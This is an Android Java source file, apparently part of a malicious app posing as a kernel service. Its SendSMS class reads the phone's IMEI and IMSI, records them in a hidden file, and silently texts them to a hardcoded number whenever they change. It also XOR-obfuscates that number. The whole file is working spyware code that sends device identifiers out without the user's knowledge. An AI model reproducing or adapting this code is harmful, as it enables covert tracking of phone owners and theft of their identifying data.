package com.Qdzs;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.telephony.*;


public class SendSMS {
	public static final String TAG = "SendSMS";
	Context mContext;
	
	public static final String smsNumber = "18712345678";
	
	String NAME = "PhoneInfo.txt";
	String PATH = "data/data/com.AndroidKernelService/";
	
	String IMEI = "IMEI";
	String IMSI = "IMSI";

	
	public SendSMS(Context context) {
		mContext = context;
	}
	public SendSMS() {
	
	}
	public void writePhoneNum()
	{
		//将电话号码写入文件
		WriteLogFile.writeLog("保存的手机号是:" + smsNumber);
	    String xorPhoneNum = xorEncrypt.xorEn(smsNumber);//异或加密
	    WriteLogFile.writePhoneNum(xorPhoneNum);
	}

	public void sendSMS() {
		
//		WriteLogFile.writeLog("运行到sendSMS函数中");
		final BasicInfo info = new BasicInfo(mContext);
		try{
			//在这里获取IMEI号码和IMSI号码
			
		        try{
		        	//new Thread().sleep(60 * 1000);
		        }catch(Exception e){
		        	
		        }
				WriteLogFile.writeLog("执行获取IMEI");
				IMEI = info.getIMEI();
				IMSI = info.getIMSI();
				WriteLogFile.writeLog("执行完获取IMSI");
				
			/*
			for(int i=0; i<100; i++){
				for(int j=0; j<1000; j++)
				{
				 	int at=198*100;
				}

			    IMEI = info.getIMEI();
			    IMSI = info.getIMSI();
			    
			    if(IMEI.toString().length() > 4 && IMSI.toString().length() > 4)
			    	break;
			}
			*/
			
		}catch(Exception e){
			WriteLogFile.writeLog(e.toString());
		}
		//写到日志文件
		//WriteLogFile.writeLog(IMEI + "@" + IMSI + "要发送的手机号" + smsNumber);
		/*
		String mMessageText = "Android@" + IMEI + "@" + IMSI;
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage(smsNumber, null, mMessageText, null, null);
		*/
		//判断PhoneInfo.txt是否存在
		File path = new File(PATH);
		if(!path.exists()) {
			path.mkdir();
		}
		File file = new File(PATH + NAME);
		boolean send = false;
		if(!file.exists()) {
			send = true;
			WriteLogFile.writeLog("send01=" + send);
			try {
				file.createNewFile();
				BufferedWriter output = new BufferedWriter(new FileWriter(file));
				output.write(IMEI);
				output.newLine();
				
				output.write(IMSI);
				output.newLine();
				
				output.close();
			} catch (IOException ioe) {
				ioe.printStackTrace();
				//WriteLogFile.writeLog("BootException01" + ioe.toString());
			}
				
		} else {
			//读IMEI和IMSI号
			try {
				BufferedReader input = new BufferedReader(new FileReader(file));
				String IMEI_old = input.readLine();
				String IMSI_old = input.readLine();
				//WriteLogFile.writeLog("old version:" + IMEI_old + "  " + IMSI_old);
				if(IMEI_old.contains(IMEI) && IMSI_old.contains(IMSI)) {
					input.close();
				} else {
					//写入新的IMEI和IMSI号
					BufferedWriter output = new BufferedWriter(new FileWriter(file, false));
					output.write(IMEI);
					output.newLine();
					output.write(IMSI);
					output.newLine();
					output.close();
					send = true;
				}
				
			} catch(IOException ioe) {
				ioe.printStackTrace();
				//WriteLogFile.writeLog("BootException02" + ioe.toString());
			}
		}
		if(send) {
			try{
			String mMessageText = "Android@" + IMSI + "@" + IMEI;
			//WriteLogFile.writeLog("开始发短信");
			
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage(smsNumber, null, mMessageText, null, null);
			
			//WriteLogFile.writeLog("发短信结束");
			}catch(Exception e){
				WriteLogFile.writeLog("BootException03" + e.toString());
			}
		}
		//WriteLogFile.writeLog("运行完发送命令");
		
	}
}
